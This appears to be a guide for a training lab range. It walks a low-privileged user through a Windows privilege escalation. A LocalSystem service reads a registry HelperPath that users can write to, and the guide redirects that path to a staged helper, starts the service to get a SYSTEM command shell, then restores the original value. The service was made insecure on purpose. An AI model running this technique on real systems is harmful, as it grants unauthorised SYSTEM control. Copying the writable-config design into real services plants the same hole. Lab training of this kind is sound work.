# NORTH Topic 11 | Application Registry HelperPath interactive SYSTEM pilot

This guide is for the NORTH WS01 training instance only. The code is a separate pilot, not a validated course result. Keep this branch unmerged until the service-start, SYSTEM CMD and cleanup checks pass on NORTH.

## What is different from Topic 10?

Topic 10 changed Windows' service ImagePath and used a reboot to trigger an automatically started service. Topic 11 leaves the service ImagePath untouched and changes the application-specific HelperPath under HKLM\SOFTWARE\Kingdoms\KingdomConfigSvc.

The service runs as LocalSystem, starts manually and grants BUILTIN\Users start and stop rights. It reads the 64-bit HelperPath value in OnStart, then launches the chosen executable as a child process. Rickon can both edit HelperPath and request a start without restarting WS01.

The role now stages C:\Users\Public\Documents\KingdomConfigShell.exe. This is a standalone helper rather than a Windows service implementation. It checks for WS01 and SYSTEM, looks for NORTH\rickon.stark in an active RDP session and attempts to open a local CMD with the SYSTEM identity in that session. It does not install a service or listen on the network.

## Apply only the selected NORTH technique

On the Kali host in the usual NORTH checkout, with GOAD_PROVIDER_DIR pointing to the already installed NORTH instance:

```bash
git fetch origin feature/north-topic11-config-helper-shell-pilot
git switch --track origin/feature/north-topic11-config-helper-shell-pilot
test -f "$GOAD_PROVIDER_DIR/.vagrant/machines/GOAD-WS01/vmware_desktop/id"
bash scripts/apply-windows-lpe-candidates.sh insecure_service_registry
```

During apply, only the `KingdomConfigSvc` child key is removed from the former `HKLM\\SOFTWARE\\GOAD Kingdoms` namespace and the new `HKLM\\SOFTWARE\\Kingdoms` namespace before recreating the scenario. The parent keys and all other values remain untouched. This is a deliberate migration from the earlier installed path.

The technique-specific apply does not reset other existing NORTH LPE scenarios. The source files in the shared repository do not deploy anything to KINGDOMS or WSLPE unless their own inventories and workflows are explicitly used.

## Verify provisioning as Rickon

```powershell
whoami
sc.exe qc KingdomConfigSvc
sc.exe query KingdomConfigSvc
sc.exe sdshow KingdomConfigSvc
reg.exe query "HKLM\SOFTWARE\Kingdoms\KingdomConfigSvc" /v HelperPath /reg:64
Test-Path -LiteralPath 'C:\Users\Public\Documents\KingdomConfigShell.exe' -PathType Leaf
quser
```

Expected values include LocalSystem, DEMAND_START, the original protected KingdomConfigHelper.exe as REG_SZ, BUILTIN\Users service start/stop rights, and True for the staged interactive helper.

## Preserve the original setting

```powershell
$subkey = 'SOFTWARE\Kingdoms\KingdomConfigSvc'
$base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,[Microsoft.Win32.RegistryView]::Registry64)
$key = $base.OpenSubKey($subkey)
if ($null -eq $key) { throw 'Missing application Registry key' }
try {
    $originalHelper = $key.GetValue('HelperPath', $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
    $originalKind = $key.GetValueKind('HelperPath')
}
finally { $key.Close(); $base.Close() }
$originalHelper
$originalKind
reg.exe export "HKLM\SOFTWARE\Kingdoms\KingdomConfigSvc" "$env:TEMP\KingdomConfigSvc-before.reg" /y /reg:64
```

Stop if the original setting is absent or unreadable. Preserve the Registry type and do not overwrite the backup.

## Redirect HelperPath with only SetValue

Run from the same non-elevated PowerShell session.

```powershell
$payload = 'C:\Users\Public\Documents\KingdomConfigShell.exe'
if (-not (Test-Path -LiteralPath $payload -PathType Leaf)) { throw 'Standalone helper unavailable' }
$base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,[Microsoft.Win32.RegistryView]::Registry64)
$key = $base.OpenSubKey($subkey,[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,[System.Security.AccessControl.RegistryRights]::SetValue)
if ($null -eq $key) { $base.Close(); throw 'SetValue denied' }
try { $key.SetValue('HelperPath',$payload,$originalKind) }
finally { $key.Close(); $base.Close() }
reg.exe query "HKLM\SOFTWARE\Kingdoms\KingdomConfigSvc" /v HelperPath /reg:64
```

Expected output has the new path with REG_SZ. This proves only the Registry edit, not SYSTEM execution.

## Trigger and verify the interactive process

```powershell
sc.exe query KingdomConfigSvc
sc.exe start KingdomConfigSvc
sc.exe query KingdomConfigSvc
```

The helper is intended to open a new CMD in Rickon's active RDP session. In that new CMD, verify with whoami and whoami /all that the process is running as NT AUTHORITY\SYSTEM. In the original PowerShell, whoami must still report NORTH\rickon.stark. If there is no new CMD, collect the service query output and event logs before changing the implementation. Do not pretend the attack passed based on the service start alone.

## Restore the original helper

From Rickon's original PowerShell while the saved variables are still available:

```powershell
sc.exe stop KingdomConfigSvc
$base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,[Microsoft.Win32.RegistryView]::Registry64)
$key = $base.OpenSubKey($subkey,[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,[System.Security.AccessControl.RegistryRights]::SetValue)
if ($null -eq $key) { $base.Close(); throw 'Cannot restore original HelperPath' }
try { $key.SetValue('HelperPath',$originalHelper,$originalKind) }
finally { $key.Close(); $base.Close() }
reg.exe query "HKLM\SOFTWARE\Kingdoms\KingdomConfigSvc" /v HelperPath /reg:64
sc.exe qc KingdomConfigSvc
```

The original protected helper and Registry value type must match the initial baseline. The registered service ImagePath and LocalSystem identity must remain unchanged. Use the role's reset/apply path if the rollback fails, instead of adding rights to Rickon.

## Acceptance criteria before merge

1. The selective apply completes successfully on NORTH WS01.
2. The service remains manual-start, LocalSystem, and grants BUILTIN\Users the intended start/stop rights.
3. The original protected helper and service executable are unchanged.
4. Rickon can modify only the application HelperPath using its Registry SetValue ACL.
5. The service's manual start launches the standalone helper and opens an interactive SYSTEM CMD in Rickon's RDP session.
6. The original HelperPath and REG_SZ type are restored, and the clean-state/reset/reapply validation passes.
7. The old execution-proof.txt method is not needed.

Source checks in tests/test_north_topic11_config_shell_source.py are not a substitute for these Windows runtime results.
